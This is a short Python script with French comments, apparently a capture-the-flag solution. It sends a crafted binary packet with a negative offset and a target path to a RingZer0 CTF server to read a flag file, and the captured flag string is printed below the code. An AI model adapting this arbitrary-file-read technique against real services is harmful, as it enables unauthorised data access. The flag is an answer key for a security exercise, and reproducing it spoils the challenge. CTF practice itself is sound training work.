
```python
import socket
import struct
HOST = "ringzer0ctf.com"
PORT = 10068  # Le port du serveur donné

# Paramètres du fichier que l'on veut lire
filepath = b"/challenges/68/flag.txt"  # Le fichier cible sur le serveur (en bytes)
bytes_to_read = 100                    # Nombre d'octets que l'on souhaite récupérer

# 1. Construction de l'en-tête (Offsets 0x00 à 0x0f)
# '3s' = 3 chars, 'i' = int (4 octets), 'I' = unsigned int (4 octets)
# Le format '<' indique le format Little-Endian (standard sur architecture x86/x64)
header = struct.pack("<3sxiII", b"Ucp", -10, bytes_to_read, len(filepath))

payload = header + filepath
padding_size = 0x110 - len(payload)
payload += b"\x00" * padding_size

payload += struct.pack("<I", 1)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))    
    s.sendall(payload)    
    response = s.recv(4096)
    print(response.decode(errors='ignore'))
    
except Exception as e:
    print(f"Erreur : {e}")
finally:
    s.close()
```

FLAG-afzxYwBYKokRDzQ5h78bOlWYJP0N